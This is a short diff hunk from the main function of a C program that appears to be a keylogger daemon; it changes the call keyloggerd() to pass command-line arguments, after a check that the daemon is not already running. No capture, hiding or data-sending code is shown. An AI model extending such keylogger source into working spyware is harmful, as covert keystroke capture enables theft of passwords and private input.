@@ -187,7 +187,7 @@ int main(int argc, char *argv[])
         err_quit("Aborting: daemon is already running");
     }
 
-    keyloggerd();
+    keyloggerd(cmd_args);
 
     logger.info("Stopping daemon");
     logger.close();
